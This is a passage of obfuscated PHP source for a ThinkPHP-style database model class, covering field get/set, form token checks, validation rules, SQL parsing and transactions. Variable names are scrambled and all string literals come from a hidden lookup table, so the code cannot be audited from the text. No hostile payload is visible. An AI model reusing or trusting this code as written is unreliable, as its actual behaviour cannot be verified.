$D…ƒˆê‚ˆ[$b°ãô„¡ÅÛ] = $D…ƒˆê‚ˆ[$fÓ²—Ìš¼]; unset($D…ƒˆê‚ˆ[$fÓ²—Ìš¼]); } } } } return $D…ƒˆê‚ˆ; } public function setField($Dé¡í‹ˆ¹Ç, $Eß·’”ŸéÌ = '') { if (is_array($Dé¡í‹ˆ¹Ç)) { $D´éšµèç‘ = $Dé¡í‹ˆ¹Ç; } else { $D´éšµèç‘[$Dé¡í‹ˆ¹Ç] = $Eß·’”ŸéÌ; } return $this->save($D´éšµèç‘); } public function setAdd($D„Û”ÒÈ …, $E×ï×Èçå’ = 1) { $fšÆ‡µ„÷³ =& $_SERVER[÷ÖêïÔÔÓ]; $bÛ‚âò‹ŸÕ = $D„Û”ÒÈ … . $fšÆ‡µ„÷³[281] . $E×ï×Èçå’; if ($E×ï×Èçå’ < 0) { $bÛ‚âò‹ŸÕ = $D„Û”ÒÈ … . $E×ï×Èçå’; } return $this->setField($D„Û”ÒÈ …, array($fšÆ‡µ„÷³[282], $bÛ‚âò‹ŸÕ)); } public function getField($e¬„·Ç‹‚, $dŠ˜š£îÒ = null) { $cÌÉ…ßˆïí =& $_SERVER[÷ÖêïÔÔÓ]; $cï­Áß½Ê[$cÌÉ…ßˆïí[258]] = $e¬„·Ç‹‚; $cï­Áß½Ê = $this->_parseOptions($cï­Áß½Ê); $e¬„·Ç‹‚ = trim($e¬„·Ç‹‚); if (strpos($e¬„·Ç‹‚, $cÌÉ…ßˆïí[47])) { if (!isset($cï­Áß½Ê[$cÌÉ…ßˆïí[277]])) { $cï­Áß½Ê[$cÌÉ…ßˆïí[277]] = is_numeric($dŠ˜š£îÒ) ? $dŠ˜š£îÒ : $cÌÉ…ßˆïí[33]; } $Dƒ«šºˆø£ = $this->db->select($cï­Áß½Ê); if (!empty($Dƒ«šºˆø£)) { goto EÃ˜Š†æé¾; A¾ÓŠ÷…‹: $cÁí±³¥‘Ö = array_shift($e¬„·Ç‹‚); $B¬ÍÙÃ¬« = array(); $Cø×Š±Ù = count($bµ¹ïè†ƒ›); goto Cäƒ“³›­Ú; Cäƒ“³›­Ú: foreach ($Dƒ«šºˆø£ as $B‚Ò¯–÷ŒÉ) { $c„™İ½ãĞ = $B‚Ò¯–÷ŒÉ[$BªÕ˜Ö¾ƒô]; if (2 == $Cø×Š±Ù) { $B¬ÍÙÃ¬«[$c„™İ½ãĞ] = $B‚Ò¯–÷ŒÉ[$cÁí±³¥‘Ö]; } else { $B¬ÍÙÃ¬«[$c„™İ½ãĞ] = is_string($dŠ˜š£îÒ) ? implode($dŠ˜š£îÒ, $B‚Ò¯–÷ŒÉ) : $B‚Ò¯–÷ŒÉ; } } return $B¬ÍÙÃ¬«; goto b„½ä‡‡…Ç; EÃ˜Š†æé¾: $bµ¹ïè†ƒ› = explode($cÌÉ…ßˆïí[47], $e¬„·Ç‹‚); $e¬„·Ç‹‚ = array_keys($Dƒ«šºˆø£[0]); $BªÕ˜Ö¾ƒô = array_shift($e¬„·Ç‹‚); goto A¾ÓŠ÷…‹; b„½ä‡‡…Ç: } } else { if (!0 !== $dŠ˜š£îÒ) { $cï­Áß½Ê[$cÌÉ…ßˆïí[277]] = is_numeric($dŠ˜š£îÒ) ? $dŠ˜š£îÒ : 1; } if ($dŠ˜š£îÒ === $cÌÉ…ßˆïí[240]) { unset($cï­Áß½Ê[$cÌÉ…ßˆïí[277]]); } $B‚Ò¯–÷ŒÉ = $this->db->select($cï­Áß½Ê); if (!empty($B‚Ò¯–÷ŒÉ)) { if ($dŠ˜š£îÒ === $cÌÉ…ßˆïí[240]) { return reset($B‚Ò¯–÷ŒÉ[0]); } if (!0 !== $dŠ˜š£îÒ && 1 == $cï­Áß½Ê[$cÌÉ…ßˆïí[277]]) { return reset($B‚Ò¯–÷ŒÉ[0]); } foreach ($B‚Ò¯–÷ŒÉ as $e¥–Ø™åÂò) { $Eê‚…øéùÒ[] = $e¥–Ø™åÂò[$e¬„·Ç‹‚]; } return $Eê‚…øéùÒ; } } return null; } public function create($BŞÍ¸ÚÑ’å = '', $b§ÉÊ›éóæ = '') { goto f¾µ±î­Â; CÑ ­©×Ì: if ($this->autoCheckFields) { $aßæŸù×Ê„ = $this->getDbFields(); foreach ($BŞÍ¸ÚÑ’å as $c›­ß„ë©« => $DøËíÜó­) { if (!in_array($c›­ß„ë©«, $aßæŸù×Ê„)) { unset($BŞÍ¸ÚÑ’å[$c›­ß„ë©«]); } elseif (MAGIC_QUOTES_GPC && is_string($DøËíÜó­)) { $BŞÍ¸ÚÑ’å[$c›­ß„ë©«] = stripslashes($DøËíÜó­); } } } $this->autoOperation($BŞÍ¸ÚÑ’å, $b§ÉÊ›éóæ); $this->data = $BŞÍ¸ÚÑ’å; goto AÈ“Í‘‰; aØ‡˜‘„±†: if (isset($aßæŸù×Ê„)) { if (is_string($aßæŸù×Ê„)) { $aßæŸù×Ê„ = explode($F´ÄÕŒ‡[47], $aßæŸù×Ê„); } if (think_config($F´ÄÕŒ‡[283])) { $aßæŸù×Ê„[] = think_config($F´ÄÕŒ‡[284]); } foreach ($BŞÍ¸ÚÑ’å as $c›­ß„ë©« => $DøËíÜó­) { if (!in_array($c›­ß„ë©«, $aßæŸù×Ê„)) { unset($BŞÍ¸ÚÑ’å[$c›­ß„ë©«]); } } } if (!$this->autoValidation($BŞÍ¸ÚÑ’å, $b§ÉÊ›éóæ)) { return !1; } if (!$this->autoCheckToken($BŞÍ¸ÚÑ’å)) { $this->error = think_lang($F´ÄÕŒ‡[285]); return !1; } goto CÑ ­©×Ì; AÈ“Í‘‰: return $BŞÍ¸ÚÑ’å; goto eğ×Ğ¨É; B¼ã°”ìÔ: $BŞÍ¸ÚÑ’å = $this->parseFieldsMap($BŞÍ¸ÚÑ’å, 0); $b§ÉÊ›éóæ = $b§ÉÊ›éóæ ? $b§ÉÊ›éóæ : (!empty($BŞÍ¸ÚÑ’å[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$F´ÄÕŒ‡[258]])) { $aßæŸù×Ê„ = $this->options[$F´ÄÕŒ‡[258]]; unset($this->options[$F´ÄÕŒ‡[258]]); } elseif ($b§ÉÊ›éóæ == THINK_MODEL_INSERT && isset($this->insertFields)) { $aßæŸù×Ê„ = $this->insertFields; } elseif ($b§ÉÊ›éóæ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $aßæŸù×Ê„ = $this->updateFields; } goto aØ‡˜‘„±†; f¾µ±î­Â: $F´ÄÕŒ‡ =& $_SERVER[÷ÖêïÔÔÓ]; if (empty($BŞÍ¸ÚÑ’å)) { $BŞÍ¸ÚÑ’å = $_POST; } elseif (is_object($BŞÍ¸ÚÑ’å)) { $BŞÍ¸ÚÑ’å = get_object_vars($BŞÍ¸ÚÑ’å); } if (empty($BŞÍ¸ÚÑ’å) || !is_array($BŞÍ¸ÚÑ’å)) { $this->error = think_lang($F´ÄÕŒ‡[256]); return !1; } goto B¼ã°”ìÔ; eğ×Ğ¨É: } public function autoCheckToken($dÇÀ®Öâ) { $añéäø»† =& $_SERVER[÷ÖêïÔÔÓ]; if (isset($this->options[$añéäø»†[286]]) && !$this->options[$añéäø»†[286]]) { return !0; } if (think_config($añéäø»†[283])) { $DÅÉÜğö˜’ = think_config($añéäø»†[284]); if (!isset($dÇÀ®Öâ[$DÅÉÜğö˜’]) || Session::get($DÅÉÜğö˜’)) { return !1; } list($a† ªÎÛßÙ, $aÈ®•Ÿ©‹Ô) = explode($añéäø»†[71], $dÇÀ®Öâ[$DÅÉÜğö˜’]); if ($aÈ®•Ÿ©‹Ô && Session::get($DÅÉÜğö˜’ . $añéäø»†[92] . $a† ªÎÛßÙ) === $aÈ®•Ÿ©‹Ô) { Session::remove($DÅÉÜğö˜’ . $añéäø»†[92] . $a† ªÎÛßÙ); return !0; } if (think_config($añéäø»†[287])) { Session::remove($DÅÉÜğö˜’ . $añéäø»†[92] . $a† ªÎÛßÙ); } return !1; } return !0; } public function regex($d­‰ƒäÚÈ, $D¨Õ¶µ³†) { $f˜ó¡‡âó =& $_SERVER[÷ÖêïÔÔÓ]; $dÖö¾»š—Å = array($f˜ó¡‡âó[288] => $f˜ó¡‡âó[289], $f˜ó¡‡âó[290] => $f˜ó¡‡âó[291], $f˜ó¡‡âó[292] => $f˜ó¡‡âó[293], $f˜ó¡‡âó[294] => $f˜ó¡‡âó[295], $f˜ó¡‡âó[296] => $f˜ó¡‡âó[297], $f˜ó¡‡âó[298] => $f˜ó¡‡âó[299], $f˜ó¡‡âó[300] => $f˜ó¡‡âó[301], $f˜ó¡‡âó[275] => $f˜ó¡‡âó[302], $f˜ó¡‡âó[303] => $f˜ó¡‡âó[304]); if (isset($dÖö¾»š—Å[strtolower($D¨Õ¶µ³†)])) { $D¨Õ¶µ³† = $dÖö¾»š—Å[strtolower($D¨Õ¶µ³†)]; } return preg_match($D¨Õ¶µ³†, $d­‰ƒäÚÈ) === 1; } private function autoOperation(&$BÈ¹¨öó°ì, $BÂùÃÍ±¯´) { $A¡Èö¥˜É =& $_SERVER[÷ÖêïÔÔÓ]; if (!empty($this->options[$A¡Èö¥˜É[305]])) { $B…¦‰÷Î”’ = $this->options[$A¡Èö¥˜É[305]]; unset($this->options[$A¡Èö¥˜É[305]]); } elseif (!empty($this->_auto)) { $B…¦‰÷Î”’ = $this->_auto; } if (isset($B…¦‰÷Î”’)) { foreach ($B…¦‰÷Î”’ as $fèÀÀãö²) { if (empty($fèÀÀãö²[2])) { $fèÀÀãö²[2] = THINK_MODEL_INSERT; } if ($BÂùÃÍ±¯´ == $fèÀÀãö²[2] || $fèÀÀãö²[2] == THINK_MODEL_BOTH) { switch (trim($fèÀÀãö²[3])) { case $A¡Èö¥˜É[306]: case $A¡Èö¥˜É[307]: $b•õ¢õ»°é = isset($fèÀÀãö²[4]) ? (array) $fèÀÀãö²[4] : array(); if (isset($BÈ¹¨öó°ì[$fèÀÀãö²[0]])) { array_unshift($b•õ¢õ»°é, $BÈ¹¨öó°ì[$fèÀÀãö²[0]]); } if ($A¡Èö¥˜É[306] == $fèÀÀãö²[3]) { $BÈ¹¨öó°ì[$fèÀÀãö²[0]] = call_user_func_array($fèÀÀãö²[1], $b•õ¢õ»°é); } else { $BÈ¹¨öó°ì[$fèÀÀãö²[0]] = call_user_func_array(array(&$this, $fèÀÀãö²[1]), $b•õ¢õ»°é); } break; case $A¡Èö¥˜É[258]: $BÈ¹¨öó°ì[$fèÀÀãö²[0]] = $BÈ¹¨öó°ì[$fèÀÀãö²[1]]; break; case $A¡Èö¥˜É[308]: if ($A¡Èö¥˜É[33] === $BÈ¹¨öó°ì[$fèÀÀãö²[0]]) { unset($BÈ¹¨öó°ì[$fèÀÀãö²[0]]); } break; case $A¡Èö¥˜É[309]: default: $BÈ¹¨öó°ì[$fèÀÀãö²[0]] = $fèÀÀãö²[1]; } if (!1 === $BÈ¹¨öó°ì[$fèÀÀãö²[0]]) { unset($BÈ¹¨öó°ì[$fèÀÀãö²[0]]); } } } } return $BÈ¹¨öó°ì; } protected function autoValidation($a‰ˆ‚™ØŒ, $DÅ˜£ßÆè†) { $CŸé¤ñ‰‰Ñ =& $_SERVER[÷ÖêïÔÔÓ]; if (!empty($this->options[$CŸé¤ñ‰‰Ñ[310]])) { $bå„Ê‚Á¸… = $this->options[$CŸé¤ñ‰‰Ñ[310]]; unset($this->options[$CŸé¤ñ‰‰Ñ[310]]); } elseif (!empty($this->_validate)) { $bå„Ê‚Á¸… = $this->_validate; } if (isset($bå„Ê‚Á¸…)) { if ($this->patchValidate) { $this->error = array(); } foreach ($bå„Ê‚Á¸… as $càì…Ûó„ => $f¢­ëŸÓã·) { if (empty($f¢­ëŸÓã·[5]) || $f¢­ëŸÓã·[5] == THINK_MODEL_BOTH || $f¢­ëŸÓã·[5] == $DÅ˜£ßÆè†) { if (0 == strpos($f¢­ëŸÓã·[2], $CŸé¤ñ‰‰Ñ[311]) && strpos($f¢­ëŸÓã·[2], $CŸé¤ñ‰‰Ñ[312])) { $f¢­ëŸÓã·[2] = think_lang(substr($f¢­ëŸÓã·[2], 2, -1)); } $f¢­ëŸÓã·[3] = isset($f¢­ëŸÓã·[3]) ? $f¢­ëŸÓã·[3] : THINK_EXISTS_VALIDATE; $f¢­ëŸÓã·[4] = isset($f¢­ëŸÓã·[4]) ? $f¢­ëŸÓã·[4] : $CŸé¤ñ‰‰Ñ[313]; switch ($f¢­ëŸÓã·[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($a‰ˆ‚™ØŒ, $f¢­ëŸÓã·)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($CŸé¤ñ‰‰Ñ[33] != trim($a‰ˆ‚™ØŒ[$f¢­ëŸÓã·[0]])) { if (!1 === $this->_validationField($a‰ˆ‚™ØŒ, $f¢­ëŸÓã·)) { return !1; } } break; default: if (isset($a‰ˆ‚™ØŒ[$f¢­ëŸÓã·[0]])) { if (!1 === $this->_validationField($a‰ˆ‚™ØŒ, $f¢­ëŸÓã·)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($e’ÖÌÍÎæ±, $B¾Î÷•ŸéË) { if (!1 === $this->_validationFieldItem($e’ÖÌÍÎæ±, $B¾Î÷•ŸéË)) { if ($this->patchValidate) { $this->error[$B¾Î÷•ŸéË[0]] = $B¾Î÷•ŸéË[2]; } else { $this->error = $B¾Î÷•ŸéË[2]; return !1; } } return; } protected function _validationFieldItem($Fö’”êĞ, $F¶ĞçœÁß) { $F¹ò‘É¯ =& $_SERVER[÷ÖêïÔÔÓ]; switch (strtolower(trim($F¶ĞçœÁß[4]))) { case $F¹ò‘É¯[306]: case $F¹ò‘É¯[307]: $EÚš‘¬ùÑŸ = isset($F¶ĞçœÁß[6]) ? (array) $F¶ĞçœÁß[6] : array(); if (is_string($F¶ĞçœÁß[0]) && strpos($F¶ĞçœÁß[0], $F¹ò‘É¯[47])) { $F¶ĞçœÁß[0] = explode($F¹ò‘É¯[47], $F¶ĞçœÁß[0]); } if (is_array($F¶ĞçœÁß[0])) { foreach ($F¶ĞçœÁß[0] as $bò„Ôœ) { $dÎÄ¼Ì×®±[$bò„Ôœ] = $Fö’”êĞ[$bò„Ôœ]; } array_unshift($EÚš‘¬ùÑŸ, $dÎÄ¼Ì×®±); } else { array_unshift($EÚš‘¬ùÑŸ, $Fö’”êĞ[$F¶ĞçœÁß[0]]); } if ($F¹ò‘É¯[306] == $F¶ĞçœÁß[4]) { return call_user_func_array($F¶ĞçœÁß[1], $EÚš‘¬ùÑŸ); } else { return call_user_func_array(array(&$this, $F¶ĞçœÁß[1]), $EÚš‘¬ùÑŸ); } case $F¹ò‘É¯[314]: return $Fö’”êĞ[$F¶ĞçœÁß[0]] == $Fö’”êĞ[$F¶ĞçœÁß[1]]; case $F¹ò‘É¯[315]: if (is_string($F¶ĞçœÁß[0]) && strpos($F¶ĞçœÁß[0], $F¹ò‘É¯[47])) { $F¶ĞçœÁß[0] = explode($F¹ò‘É¯[47], $F¶ĞçœÁß[0]); } $CÔôø›Óøô = array(); if (is_array($F¶ĞçœÁß[0])) { foreach ($F¶ĞçœÁß[0] as $bò„Ôœ) { $CÔôø›Óøô[$bò„Ôœ] = $Fö’”êĞ[$bò„Ôœ]; } } else { $CÔôø›Óøô[$F¶ĞçœÁß[0]] = $Fö’”êĞ[$F¶ĞçœÁß[0]]; } if (!empty($Fö’”êĞ[$this->getPk()])) { $CÔôø›Óøô[$this->getPk()] = array($F¹ò‘É¯[316], $Fö’”êĞ[$this->getPk()]); } if ($this->where($CÔôø›Óøô)->find()) { return !1; } return !0; default: return $this->check($Fö’”êĞ[$F¶ĞçœÁß[0]], $F¶ĞçœÁß[1], $F¶ĞçœÁß[4]); } } public function check($eËç¦¤ˆÀš, $f‹ªÉõã¡ , $d¹˜ÕŸÚ® = "\162\145\x67\145\170") { $b¾²‡¯‰ÉŸ =& $_SERVER[÷ÖêïÔÔÓ]; $d¹˜ÕŸÚ® = strtolower(trim($d¹˜ÕŸÚ®)); switch ($d¹˜ÕŸÚ®) { case $b¾²‡¯‰ÉŸ[7]: case $b¾²‡¯‰ÉŸ[317]: $bˆ‘ÈßÊ†¡ = is_array($f‹ªÉõã¡ ) ? $f‹ªÉõã¡  : explode($b¾²‡¯‰ÉŸ[47], $f‹ªÉõã¡ ); return $d¹˜ÕŸÚ® == $b¾²‡¯‰ÉŸ[7] ? in_array($eËç¦¤ˆÀš, $bˆ‘ÈßÊ†¡) : !in_array($eËç¦¤ˆÀš, $bˆ‘ÈßÊ†¡); case $b¾²‡¯‰ÉŸ[318]: case $b¾²‡¯‰ÉŸ[319]: if (is_array($f‹ªÉõã¡ )) { $E§ƒìÅÄ¯À = $f‹ªÉõã¡ [0]; $e‘Óùæ·Ó« = $f‹ªÉõã¡ [1]; } else { list($E§ƒìÅÄ¯À, $e‘Óùæ·Ó«) = explode($b¾²‡¯‰ÉŸ[47], $f‹ªÉõã¡ ); } return $d¹˜ÕŸÚ® == $b¾²‡¯‰ÉŸ[318] ? $eËç¦¤ˆÀš >= $E§ƒìÅÄ¯À && $eËç¦¤ˆÀš <= $e‘Óùæ·Ó« : $eËç¦¤ˆÀš < $E§ƒìÅÄ¯À || $eËç¦¤ˆÀš > $e‘Óùæ·Ó«; case $b¾²‡¯‰ÉŸ[320]: case $b¾²‡¯‰ÉŸ[321]: return $d¹˜ÕŸÚ® == $b¾²‡¯‰ÉŸ[320] ? $eËç¦¤ˆÀš == $f‹ªÉõã¡  : $eËç¦¤ˆÀš != $f‹ªÉõã¡ ; case $b¾²‡¯‰ÉŸ[322]: $Dˆëµ©â¦¯ = mb_strlen($eËç¦¤ˆÀš, $b¾²‡¯‰ÉŸ[323]); if (strpos($f‹ªÉõã¡ , $b¾²‡¯‰ÉŸ[47])) { list($E§ƒìÅÄ¯À, $e‘Óùæ·Ó«) = explode($b¾²‡¯‰ÉŸ[47], $f‹ªÉõã¡ ); return $Dˆëµ©â¦¯ >= $E§ƒìÅÄ¯À && $Dˆëµ©â¦¯ <= $e‘Óùæ·Ó«; } else { return $Dˆëµ©â¦¯ == $f‹ªÉõã¡ ; } case $b¾²‡¯‰ÉŸ[324]: list($E³ËÜÌîà, $DÃ²—ˆœß) = explode($b¾²‡¯‰ÉŸ[47], $f‹ªÉõã¡ ); if (!is_numeric($E³ËÜÌîà)) { $E³ËÜÌîà = strtotime($E³ËÜÌîà); } if (!is_numeric($DÃ²—ˆœß)) { $DÃ²—ˆœß = strtotime($DÃ²—ˆœß); } return NOW_TIME >= $E³ËÜÌîà && NOW_TIME <= $DÃ²—ˆœß; case $b¾²‡¯‰ÉŸ[325]: return in_array(get_client_ip(), explode($b¾²‡¯‰ÉŸ[47], $f‹ªÉõã¡ )); case $b¾²‡¯‰ÉŸ[326]: return !in_array(get_client_ip(), explode($b¾²‡¯‰ÉŸ[47], $f‹ªÉõã¡ )); case $b¾²‡¯‰ÉŸ[313]: default: return $this->regex($eËç¦¤ˆÀš, $f‹ªÉõã¡ ); } } public function query($C´ƒ½…ÀÌ¨, $AÈ»÷š™…İ = false) { $c„İÕÏË­Ô =& $_SERVER[÷ÖêïÔÔÓ]; if (!is_bool($AÈ»÷š™…İ) && !is_array($AÈ»÷š™…İ)) { $AÈ»÷š™…İ = func_get_args(); array_shift($AÈ»÷š™…İ); } $C´ƒ½…ÀÌ¨ = str_replace(array($c„İÕÏË­Ô[214], $c„İÕÏË­Ô[327]), $c„İÕÏË­Ô[50], $C´ƒ½…ÀÌ¨); $C´ƒ½…ÀÌ¨ = $this->parseSql($C´ƒ½…ÀÌ¨, $AÈ»÷š™…İ); return $this->db->query($C´ƒ½…ÀÌ¨); } public function execute($B¾ÁŞ¦‘ò, $a¦¤“ïœ÷ = false) { if (!is_bool($a¦¤“ïœ÷) && !is_array($a¦¤“ïœ÷)) { $a¦¤“ïœ÷ = func_get_args(); array_shift($a¦¤“ïœ÷); } $B¾ÁŞ¦‘ò = $this->parseSql($B¾ÁŞ¦‘ò, $a¦¤“ïœ÷); return $this->db->execute($B¾ÁŞ¦‘ò); } protected function parseSql($Cò…æê²º¬, $fØíùĞÁ) { $EÍ°¶¢¢À³ =& $_SERVER[÷ÖêïÔÔÓ]; if (!0 === $fØíùĞÁ) { $F¯ó¼Š„¼™ = $this->_parseOptions(); $Cò…æê²º¬ = $this->db->parseSql($Cò…æê²º¬, $F¯ó¼Š„¼™); } elseif (is_array($fØíùĞÁ)) { $fØíùĞÁ = array_map(array($this->db, $EÍ°¶¢¢À³[328]), $fØíùĞÁ); $Cò…æê²º¬ = vsprintf($Cò…æê²º¬, $fØíùĞÁ); } else { $Cò…æê²º¬ = strtr($Cò…æê²º¬, array($EÍ°¶¢¢À³[329] => $this->getTableName(), $EÍ°¶¢¢À³[330] => think_config($EÍ°¶¢¢À³[229]))); } $this->db->setModel($this->name); return $Cò…æê²º¬; } public function db($D„Ïîø  = '', $F‚ß¡ŠŒÈ¸ = '', $Eåòè‰É¤¿ = array()) { goto a™Ş’ìöÑô; a™Ş’ìöÑô: $b÷ì¶Ô™¸ğ =& $_SERVER[÷ÖêïÔÔÓ]; if ($b÷ì¶Ô™¸ğ[33] === $D„Ïîø  && $this->db) { return $this->db; } static $E¨Û³ÚÇÕ = array(); goto DŒ¬ßõ†Ñ; DŒ¬ßõ†Ñ: static $e½ŒøÃµÖÇ = array(); if (!isset($e½ŒøÃµÖÇ[$D„Ïîø ]) || isset($e½ŒøÃµÖÇ[$D„Ïîø ]) && $F‚ß¡ŠŒÈ¸ && $E¨Û³ÚÇÕ[$D„Ïîø ] != $F‚ß¡ŠŒÈ¸) { if (!empty($F‚ß¡ŠŒÈ¸) && is_string($F‚ß¡ŠŒÈ¸) && !1 === strpos($F‚ß¡ŠŒÈ¸, $b÷ì¶Ô™¸ğ[8])) { $F‚ß¡ŠŒÈ¸ = think_config($F‚ß¡ŠŒÈ¸); } $e½ŒøÃµÖÇ[$D„Ïîø ] = Db::getInstance($F‚ß¡ŠŒÈ¸); } elseif (NULL === $F‚ß¡ŠŒÈ¸) { $e½ŒøÃµÖÇ[$D„Ïîø ]->close(); unset($e½ŒøÃµÖÇ[$D„Ïîø ]); return; } if (!empty($Eåòè‰É¤¿)) { if (is_string($Eåòè‰É¤¿)) { parse_str($Eåòè‰É¤¿, $Eåòè‰É¤¿); } foreach ($Eåòè‰É¤¿ as $EŞÙíéóµ => $d¿Ôùà“ĞÕ) { $this->setProperty($EŞÙíéóµ, $d¿Ôùà“ĞÕ); } } goto a‰©‹®õØê; a‰©‹®õØê: $E¨Û³ÚÇÕ[$D„Ïîø ] = $F‚ß¡ŠŒÈ¸; $this->db = $e½ŒøÃµÖÇ[$D„Ïîø ]; $this->_after_db(); goto c…ÙÅ¢Œ£„; c…ÙÅ¢Œ£„: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto bÖÃƒöÂ˜ï; bÖÃƒöÂ˜ï: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $eñˆ¿ÊÕÖ = get_class($this); if ($eñˆ¿ÊÕÖ == $_SERVER[÷ÖêïÔÔÓ][331]) { return $this->name; } $this->name = substr($eñˆ¿ÊÕÖ, 0, -5); } return $this->name; } public function getTableName() { $e£òµ›å =& $_SERVER[÷ÖêïÔÔÓ]; if (empty($this->trueTableName)) { $E²—ŠéòóÂ = !empty($this->tablePrefix) ? $this->tablePrefix : $e£òµ›å[33]; if (!empty($this->tableName)) { $E²—ŠéòóÂ .= $this->tableName; } else { $E²—ŠéòóÂ .= think_parse_name($this->name); } $this->trueTableName = strtolower($E²—ŠéòóÂ); } return (!empty($this->dbName) ? $this->dbName . $e£òµ›å[92] : $e£òµ›å[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $D¿è¸«ğ± =& $_SERVER[÷ÖêïÔÔÓ]; return isset($this->fields[$D¿è¸«ğ±[236]]) ? $this->fields[$D¿è¸«ğ±[236]] : $this->pk; } public function getDbFields() { $DˆĞ·î­¥ =& $_SERVER[÷ÖêïÔÔÓ]; if (isset($this->options[$DˆĞ·î­¥[264]])) { $c®ˆ¬¦‚ƒ = $this->db->getFields($this->options[$DˆĞ·î­¥[264]]); return $c®ˆ¬¦‚ƒ ? array_keys($c®ˆ¬¦‚ƒ) : !1; } if ($this->fields) { $c®ˆ¬¦‚ƒ = $this->fields; unset($c®ˆ¬¦‚ƒ[$DˆĞ·î­¥[235]], $c®ˆ¬¦‚ƒ[$DˆĞ·î­¥[236]], $c®ˆ¬¦‚ƒ[$DˆĞ·î­¥[237]], $c®ˆ¬¦‚ƒ[$DˆĞ·î­¥[234]]); return $c®ˆ¬¦‚ƒ; } return !1; } public function data($f×ê ŒƒªÇ = '') { $CÄµŞÀÌó =& $_SERVER[÷ÖêïÔÔÓ]; if ($CÄµŞÀÌó[33] === $f×ê ŒƒªÇ && !empty($this->data)) { return $this->data; } if (is_object($f×ê ŒƒªÇ)) { $f×ê ŒƒªÇ = get_object_vars($f×ê ŒƒªÇ); } elseif (is_string($f×ê ŒƒªÇ)) { parse_str($f×ê ŒƒªÇ, $f×ê ŒƒªÇ); } elseif (!is_array($f×ê ŒƒªÇ)) { think_exception(think_lang($CÄµŞÀÌó[256])); } $this->data = $f×ê ŒƒªÇ; return $this; } public function join($e„óÁÕ½ÑÅ) { $a‡²™½œñ™ =& $_SERVER[÷ÖêïÔÔÓ]; if (is_array($e„óÁÕ½ÑÅ)) { $this->options[$a‡²™½œñ™[267]] = $e„óÁÕ½ÑÅ; } elseif (!empty($e„óÁÕ½ÑÅ)) { $this->options[$a‡²™½œñ™[267]][] = $e„óÁÕ½ÑÅ; } return $this; } public function union($cÏÍòåİÛÄ, $c§•«ãô¾ë = false) { goto Eé†»…“˜…; fÇß›¾”È: if (is_object($cÏÍòåİÛÄ)) { $cÏÍòåİÛÄ = get_object_vars($cÏÍòåİÛÄ); } if (is_string($cÏÍòåİÛÄ)) { $A‘‰Õ³Û‚ = $cÏÍòåİÛÄ; } elseif (is_array($cÏÍòåİÛÄ)) { if (isset($cÏÍòåİÛÄ[0])) { $this->options[$eÍ˜–©ÂòÂ[332]] = array_merge($this->options[$eÍ˜–©ÂòÂ[332]], $cÏÍòåİÛÄ); return $this; } else { $A‘‰Õ³Û‚ = $cÏÍòåİÛÄ; } } else { think_exception(think_lang($eÍ˜–©ÂòÂ[256])); } $this->options[$eÍ˜–©ÂòÂ[332]][] = $A‘‰Õ³Û‚; goto AˆÎÛ÷––; AˆÎÛ÷––: return $this; goto b‘Ø‰‚ÓŞÍ; Eé†»…“˜…: $eÍ˜–©ÂòÂ =& $_SERVER[÷ÖêïÔÔÓ]; if (empty($cÏÍòåİÛÄ)) { return $this; } if ($c§•«ãô¾ë) { $this->options[$eÍ˜–©ÂòÂ[332]][$eÍ˜–©ÂòÂ[333]] = !0; } goto fÇß›¾”È; b‘Ø‰‚ÓŞÍ: } public function cache($bõ»œøœƒ = true, $EˆŒ¹†”¯¸ = null, $bÊß£‡™âŠ = '') { $eÓ«¤¥ë´ =& $_SERVER[÷ÖêïÔÔÓ]; if (!1 !== $bõ»œøœƒ) { $this->options[$eÓ«¤¥ë´[334]] = array($eÓ«¤¥ë´[88] => $bõ»œøœƒ, $eÓ«¤¥ë´[324] => $EˆŒ¹†”¯¸, $eÓ«¤¥ë´[29] => $bÊß£‡™âŠ); } return $this; } public function field($FÆ“á¢ ŸÖ, $DùÏ‡Æ† = false) { $dÍä Ã£‰ =& $_SERVER[÷ÖêïÔÔÓ]; if (!0 === $FÆ“á¢ ŸÖ) { $Aºù„Ğ‡Ó = $this->getDbFields(); $FÆ“á¢ ŸÖ = $Aºù„Ğ‡Ó ? $Aºù„Ğ‡Ó : $dÍä Ã£‰[173]; } elseif ($DùÏ‡Æ†) { if (is_string($FÆ“á¢ ŸÖ)) { $FÆ“á¢ ŸÖ = explode($dÍä Ã£‰[47], $FÆ“á¢ ŸÖ); } $Aºù„Ğ‡Ó = $this->getDbFields(); $FÆ“á¢ ŸÖ = $Aºù„Ğ‡Ó ? array_diff($Aºù„Ğ‡Ó, $FÆ“á¢ ŸÖ) : $FÆ“á¢ ŸÖ; } $this->options[$dÍä Ã£‰[258]] = $FÆ“á¢ ŸÖ; return $this; } public function scope($f‰™³›±ÎÙ = '', $CµàÜ••›‚ = NULL) { $a›»Ã°•®­ =& $_SERVER[÷ÖêïÔÔÓ]; if ($a›»Ã°•®­[33] === $f‰™³›±ÎÙ) { if (isset($this->_scope[$a›»Ã°•®­[34]])) { $aÁ÷Î æÇµ = $this->_scope[$a›»Ã°•®­[34]]; } else { return $this; } } elseif (is_string($f‰™³›±ÎÙ)) { $AÑ‡‰¹Ê» = explode($a›»Ã°•®­[47], $f‰™³›±ÎÙ); $aÁ÷Î æÇµ = array(); foreach ($AÑ‡‰¹Ê» as $D£ÖÉ­£) { if (!isset($this->_scope[$D£ÖÉ­£])) { continue; } $aÁ÷Î æÇµ = array_merge($aÁ÷Î æÇµ, $this->_scope[$D£ÖÉ­£]); } if (!empty($CµàÜ••›‚) && is_array($CµàÜ••›‚)) { $aÁ÷Î æÇµ = array_merge($aÁ÷Î æÇµ, $CµàÜ••›‚); } } elseif (is_array($f‰™³›±ÎÙ)) { $aÁ÷Î æÇµ = $f‰™³›±ÎÙ; } if (is_array($aÁ÷Î æÇµ) && 